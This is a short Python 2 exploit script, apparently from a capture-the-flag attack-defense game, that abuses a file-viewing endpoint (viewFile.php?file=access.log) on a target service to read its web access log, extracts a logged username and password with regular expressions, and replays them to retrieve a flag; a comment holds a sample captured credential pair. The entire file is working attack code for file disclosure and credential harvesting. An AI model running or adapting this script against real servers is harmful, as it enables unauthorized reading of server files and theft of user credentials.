import socket
import urllib
import re

def recv_until(s, text):
    BUFFER_SIZE = 2048
    data = ""
    loop = True
    while loop:
        tmp = s.recv(BUFFER_SIZE)
        if tmp.find(text) != -1: loop = False
        data += tmp
    return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.7.4.2", 20093))

request = """GET /viewFile.php?file=access.log HTTP/1.1\nHost: 10.7.4.2:20093\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.4.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nConnection: keep-alive\n\n"""

s.send(request)

data = ""
result = s.recv(20000)
while len(result) > 0:
    result = s.recv(20000)
    data += result

data = data[-20000:]

flagID  = re.findall("userName=\w{16}", data)[0][9:]
pw      = re.findall("userPassword=\w{40}", data)[0][13:]


# userName=c4ab3ed8dc85897b&userPassword=2a6f28f02778ae90da9467602e1678cba68a4c65
request = "GET /viewFile.php?userName=" + flagID +"&userPassword="+ pw + " HTTP/1.1\r\nHost: 10.7.4.2:20093\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.4.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: deflate\r\nConnection: keep-alive\r\n\r\n"

print flagID
print pw

s.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.7.4.2", 20093))

s.send(request)
data = s.recv(2000)

print data
